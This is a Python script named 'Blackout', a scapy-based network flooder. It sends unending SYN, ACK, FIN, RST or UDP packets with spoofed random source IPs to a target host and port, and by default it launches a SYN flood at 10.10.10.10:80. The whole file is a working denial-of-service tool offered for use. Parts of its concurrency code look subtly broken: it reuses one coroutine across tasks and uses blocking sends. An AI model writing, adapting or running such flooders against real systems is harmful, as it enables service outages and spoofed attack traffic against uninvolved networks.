from scapy.all import IP, TCP, UDP, send
import asyncio
import random
import signal

class Blackout:
    """
    Blackout: Raw packet network flooder.
    """

    def __init__(self):
        """
        Initialize Blackout instance with TCP flags.
        """
        self.flags = {"SYN": "S", "ACK": "A", "FIN": "F", "RST": "R", "UDP": "U"}
        self.stop_event = False

        signal.signal(signal.SIGINT, self._stop_handler)
        
    def _stop_handler(self, *args):
        """Handle stop signal to terminate the flood."""
        print(end="\r\033[K", flush=True)
        self.stop_event = True

    async def tcp_flood(self, target_ip: str, target_port: int, flag: str):
        """
        Launch an infinite TCP flood with a specified TCP flag.

        Args:
            target_ip (str): Destination IP address.
            target_port (int): Destination port number.
            flag (str): TCP flag type (default is SYN).
        """
        
        while not self.stop_event:            
            src_ip = ".".join(str(random.randint(1, 255)) for _ in range(4))
            ip = IP(src=src_ip, dst=target_ip)
            tcp = TCP(
                sport=random.randint(1024, 65535),
                dport=target_port,
                flags=self.flags[flag],
            )

            packet = ip / tcp
        
            send(packet, verbose=False)
            print(f"Sent {flag} packet from {src_ip} to {target_ip}:{target_port}")

    async def udp_flood(self, target_ip: str, target_port: int):
        """
        Launch an infinite UDP flood.

        Args:
            target_ip (str): Destination IP address.
            target_port (port): Destination port number.
        """
        while not self.stop_event:
            src_ip = ".".join(str(random.randint(1, 255)) for _ in range(4))
            ip = IP(src=src_ip, dst=target_ip)
            udp = UDP(sport=random.randint(1024, 65535), dport=target_port)
            payload = random.SystemRandom().randbytes(1024)

            packet = ip / udp / payload

            send(packet, verbose=False)
            print(f"Sent UDP packet from {src_ip} to {target_ip}:{target_port}")

    async def run(self, target_ip: str, target_port: int, num_requests: int, flag: str):
        """
        Launch multiple concurrent flood tasks.

        Args:
            target_ip (str): Destination IP address.
            target_port (int): Destination port.
            num_requests (int): Number of concurrent flood tasks.
            flag (str): TCP flag used in TCP floods.
        """
        print(f"Starting {flag} flood against {target_ip}:{target_port}\n")

        if flag == "UDP":
            flood = self.udp_flood(target_ip, target_port)
        else:
            flood = self.tcp_flood(target_ip, target_port, flag)

        tasks = []
        for _ in range(num_requests):
            task = asyncio.create_task(flood)
            tasks.append(task)
        try:
            await asyncio.gather(*tasks)
        except RuntimeError:
            print("\nFlooding stopped by user.")


if __name__ == "__main__":
    blackout = Blackout()
    ip = "10.10.10.10"
    port = 80
    asyncio.run(blackout.run(ip, port, 10, "SYN"))
